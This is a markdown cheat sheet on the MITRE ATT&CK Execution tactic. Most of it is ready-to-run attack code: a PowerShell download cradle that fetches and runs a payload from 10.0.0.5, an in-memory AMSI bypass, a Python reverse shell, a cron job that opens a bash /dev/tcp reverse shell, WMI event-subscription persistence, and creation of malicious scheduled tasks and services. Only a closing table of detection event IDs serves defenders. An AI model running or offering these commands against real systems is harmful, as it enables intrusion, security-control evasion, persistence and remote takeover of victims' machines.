# MITRE ATT&CK: Execution (TA0002)

> Techniques that result in adversary-controlled code running on a local or remote system.

---

## T1059: Command and Scripting Interpreter

### T1059.001: PowerShell
- **Encoded Commands**: `-enc`, `-encodedcommand`
- **Download Cradles**: `IEX (New-Object Net.WebClient).DownloadString('...')`
- **AMSI Bypass**: Memory patching, reflection-based
- **Constrained Language Mode Bypass**: FullLanguage via COM

```powershell
# Classic download cradle
IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/payload.ps1')

# AMSI bypass (in-memory)
$a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"};$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"};$b.SetValue($null,[IntPtr]::Zero)

# Bypass execution policy
powershell -ep bypass -file script.ps1
```

### T1059.003: Windows Command Shell
- `cmd.exe /c` execution chains
- Batch file obfuscation

### T1059.005: Visual Basic
- VBA macros in Office documents
- VBS script execution via `wscript` / `cscript`

### T1059.006: Python
- PyInstaller packed executables
- Python reverse shells

```python
import socket,subprocess,os
s=socket.socket()
s.connect(("10.0.0.5",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

### T1059.007: JavaScript / JScript
- HTA files (`mshta.exe`)
- WScript execution
- Node.js payloads

---

## T1053: Scheduled Task/Job

### T1053.005: Scheduled Task (Windows)
```cmd
# Create persistent scheduled task
schtasks /create /tn "WindowsUpdate" /tr "powershell -enc AAAAA..." /sc onlogon /ru SYSTEM

# WMI-based task creation (stealthier)
wmic /node:target process call create "schtasks /create /tn Updater /tr C:\windows\temp\payload.exe /sc onidle"
```

### T1053.003: Cron (Linux)
```bash
# User crontab persistence
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'" | crontab -

# System-wide cron
echo "*/10 * * * * root /tmp/update.sh" >> /etc/crontab
```

---

## T1047: Windows Management Instrumentation (WMI)

```powershell
# Remote process creation via WMI
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName target

# WMI event subscription persistence
$filter = Set-WmiInstance -Class __EventFilter -Arguments @{Name="UpdateFilter"; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{Name="UpdateConsumer"; CommandLineTemplate="powershell.exe -enc AAAAA..."}
Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}
```

---

## T1203: Exploitation for Client Execution

- **Office Macros**: VBA, XLM, DDE
- **Browser Exploits**: V8/JIT exploitation, WebAssembly ROP
- **PDF Exploits**: JavaScript execution, embedded files
- **Media Files**: Image parsing exploits (EXIF, TIFF)

---

## T1204: User Execution

### T1204.001: Malicious Link
- Social engineering to click phishing URLs
- QR code redirection

### T1204.002: Malicious File
- Double-click execution of disguised executables
- ISO/VHD auto-mount + LNK execution

---

## T1129: Shared Modules

- DLL side-loading (legitimate EXE loads malicious DLL)
- DLL search order hijacking
- Known DLL replacement

```
Legitimate app: C:\Program Files\App\app.exe (loads app.dll)
Hijack: Place malicious app.dll in C:\Program Files\App\
```

---

## T1569: System Services

### T1569.002: Service Execution
```cmd
# Create and start malicious service
sc create UpdateService binPath= "C:\windows\temp\payload.exe" start= auto
sc start UpdateService
```

### T1569.001: Launchctl (macOS)
```bash
launchctl load -w /Library/LaunchDaemons/com.malicious.plist
```

---

## Detection Focus

| Technique | Event IDs | Logs |
|---|---|---|
| PowerShell | 4103, 4104 | PowerShell Operational |
| WMI | 5857-5859 | WMI-Activity Operational |
| Scheduled Tasks | 4698, 4702 | Security |
| Service Creation | 7045, 4697 | System, Security |
| CMD Execution | 4688 | Security (with command line) |
